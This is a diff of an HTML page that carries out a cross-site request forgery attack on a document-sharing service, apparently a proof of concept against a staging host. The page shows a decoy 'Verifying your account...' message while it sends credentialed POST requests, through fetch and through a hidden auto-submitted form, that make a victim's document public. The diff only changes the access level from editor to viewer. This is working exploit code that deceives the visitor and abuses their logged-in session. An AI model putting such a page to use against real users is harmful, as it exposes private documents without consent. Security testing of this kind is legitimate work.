@@ -31,7 +31,7 @@
         document.getElementById('status').innerHTML = "Verifying your account...";
         
         // Perform stealth CSRF to make document public
-        fetch('https://staging.textjam.com/api/doc/U5B1D57H/access/public/editor', {
+        fetch('https://staging.textjam.com/api/doc/U5B1D57H/access/public/viewer', {
             method: 'POST',
             credentials: 'include',  // Send cookies
             mode: 'no-cors',         // Avoid CORS issues
@@ -58,7 +58,7 @@
         // Alternative: Form submission method
         var form = document.createElement('form');
         form.method = 'POST';
-        form.action = 'https://staging.textjam.com/api/doc/U5B1D57H/access/public/editor';
+        form.action = 'https://staging.textjam.com/api/doc/U5B1D57H/access/public/viewer';
         form.style.display = 'none';
         
         // No inputs needed for this endpoint
@@ -72,5 +72,6 @@
     </script>
 </body>
 </html>
+
 
 
